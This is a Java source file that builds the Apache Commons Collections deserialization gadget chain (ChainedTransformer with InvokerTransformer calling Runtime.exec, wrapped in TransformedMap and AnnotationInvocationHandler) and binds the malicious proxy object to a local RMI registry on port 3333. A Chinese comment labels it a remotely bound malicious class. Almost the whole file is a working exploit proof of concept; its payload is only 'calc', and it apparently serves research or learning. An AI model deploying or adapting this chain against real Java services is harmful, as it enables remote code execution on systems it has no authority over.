import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;
//远程绑定恶意类，反序列化
public class UserServerEval {
    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[] {String.class, Class[].class},
                        new Object[] {"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[] {Object.class, Object[].class},
                        new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] {String.class},
                        new Object[] {"calc"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value", "Threezh1");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        Class AnnotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);
        cons.setAccessible(true);
        InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap);
        //proxyEvalObject被转化为代理类，实现了java.io.Serializable
        Remote proxyEvalObject = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[] { Remote.class }, evalObject));
        System.out.println(proxyEvalObject.getClass());//class com.sun.proxy.$Proxy0
        Registry registry = LocateRegistry.createRegistry(3333);
        Registry registry_remote = LocateRegistry.getRegistry("127.0.0.1", 3333);
        registry_remote.bind("HelloRegistry", proxyEvalObject);
        System.out.println("rmi start at 3333");

        //写法2
//        Proxy proxyEvalObject = (Proxy) Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[] { Remote.class }, evalObject);
//        System.out.println(proxyEvalObject.getClass());//class com.sun.proxy.$Proxy0
//        Registry registry = LocateRegistry.createRegistry(3333);
//        Registry registry_remote = LocateRegistry.getRegistry("127.0.0.1", 3333);
//        registry_remote.bind("HelloRegistry", (Remote) proxyEvalObject);
//        System.out.println("rmi start at 3333");




    }
}
